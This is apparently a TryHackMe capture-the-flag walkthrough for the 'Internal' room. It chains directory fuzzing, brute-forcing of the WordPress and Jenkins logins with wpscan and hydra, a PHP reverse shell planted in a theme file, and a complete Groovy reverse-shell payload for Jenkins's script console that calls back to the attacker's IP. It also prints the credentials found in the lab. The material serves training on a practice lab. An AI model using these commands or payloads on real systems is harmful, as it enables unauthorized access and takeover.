## [Room](https://tryhackme.com/room/internal)

## IP: 10.10.190.194

Add ip to /etc/hosts

`10.10.190.194	internal.thm`

```
ffuf -c -s -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.190.194/FUZZ
```

This will get /blog and /wordpress so we know it is a wordpress website

`http://internal.thm/blog/wp-admin`

The error say this after we try to login as admin:

`Error: The password you entered for the username admin is incorrect` 

If the error message say "password for username **admin** is incorrect", it means that we got the username right and we only need to find the password

Use burpsuite to intercept to get login parameter

`log=admin&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&testcookie=1`

```
wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt -t 64
```

`[SUCCESS] - admin / my2boys`

Usually to get reverse shell in wordpress, the common thing to do is to manipulate the .php in themes

Edit 404.php in themes with php reverse shell and go to `http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php`

And we get reverse shell as **www-date**

/opt/wp-save.txt

```
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```

ssh in and we get flag 

`THM{REDACTED}`

**jenkins.txt**

```
Internal Jenkins service is running on 172.17.0.2:8080
```

There is a server that run locally

We can ssh again but with local network include

`ssh -L 8080:127.0.0.1:8080 aubreanna@10.10.190.194`

And we see that docker0 ip now

```
System load:  0.0               Processes:              113
  Usage of /:   63.8% of 8.79GB   Users logged in:        1
  Memory usage: 34%               IP address for eth0:    10.10.190.194
  Swap usage:   0%                IP address for docker0: 172.17.0.1
```
go to 127.0.0.1:8080 and we see jenkin login page

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-post-form "/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=/&Submit=Sign in:Invalid username or password" -s 8080 -I
```

`[8080][http-post-form] host: 127.0.0.1   login: admin   password: spongebob`

After we logged in, we go to Managejenkins->Script console to get reverse shell

```
String host="$MY_IP";
int port=1234;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

And we listen on port 1234 `nc -lnvp 1234`

We get shell as **jenkins**

/opt/note.txt

```
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
```

ssh as root and can cat out root.txt

`THM{REDACTED}`
